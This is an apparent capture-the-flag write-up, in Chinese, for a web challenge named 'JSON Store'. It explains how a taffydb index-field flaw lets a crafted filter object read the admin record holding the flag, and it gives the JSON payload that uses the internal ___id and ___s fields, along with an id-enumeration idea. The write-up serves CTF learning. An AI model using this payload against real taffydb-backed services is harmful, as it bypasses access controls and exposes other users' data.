# web
### web/JSON Store

俩个路由
```js
const db = TAFFY([
    {"username": "admin", "comments": process.env.FLAG},
    {"username": "randomuser", "comments": "This is a test comment"},
]);
```
导入了taffydb这个内存数据库,存入和读取json

| 路由 | 作用 |
| ---- | ---- |
| app.post("/getData", | 获取username,filters,设置 filters["username"]=username ;`const data = db(filters).get();`返回data |
| app.post("/addData",  | 获取username,data,插入data,设置`data["username"] = username;`<br> |
感觉应该在getData下,构造一个filters,读取到admin的commnents,但是由于中间件存在express.json(),强制json解析body,导致taffy原本的查询语法部分不能使用


破案了,在npm install的时候直接提示了一个高危漏洞...
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240505224755.png)

taffydb在查询时如果找到索引,就会忽略其他条件,直接返回索引数据项,然后构造,尝试id遍历即可

```json
{
    "filters": {
        "___id":"T000002R000002",
        "___s":"true"
    },
    "username": "a"
}
```


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-05-05   22:39